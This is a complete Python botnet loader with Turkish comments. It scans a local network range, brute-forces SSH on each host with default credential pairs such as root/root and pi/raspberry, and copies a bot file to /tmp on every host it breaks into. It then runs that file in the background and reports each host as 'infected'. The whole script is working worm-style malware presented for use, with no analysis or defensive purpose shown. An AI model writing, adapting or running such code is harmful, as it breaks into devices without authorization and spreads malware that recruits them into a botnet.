#!/usr/bin/env python3
import socket
import threading
import paramiko
import ftplib
import requests

class BotLoader:
    def __init__(self):
        self.bot_file = "bot_final.py"
    
    def ssh_spread(self, host, user, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=user, password=password, timeout=10)
            
            # Bot'u yükle
            sftp = ssh.open_sftp()
            sftp.put(self.bot_file, f"/tmp/{self.bot_file}")
            sftp.close()
            
            # Çalıştır
            ssh.exec_command(f"python3 /tmp/{self.bot_file} &")
            ssh.close()
            return True
        except:
            return False
    
    def scan_and_infect(self, network="192.168.1.0/24"):
        # Basit ağ tarama ve yayılma
        import ipaddress
        
        for ip in ipaddress.IPv4Network(network):
            ip_str = str(ip)
            
            # SSH brute force denemesi
            common_creds = [
                ("root", "root"),
                ("admin", "admin"),
                ("pi", "raspberry"),
                ("user", "user")
            ]
            
            for user, passwd in common_creds:
                if self.ssh_spread(ip_str, user, passwd):
                    print(f"[+] Enfekte edildi: {ip_str}")
                    break

if __name__ == "__main__":
    loader = BotLoader()
    
    # Yerel ağı tarayıp yayıl
    print("[+] Ağ taraması başlıyor...")
    loader.scan_and_infect()
  
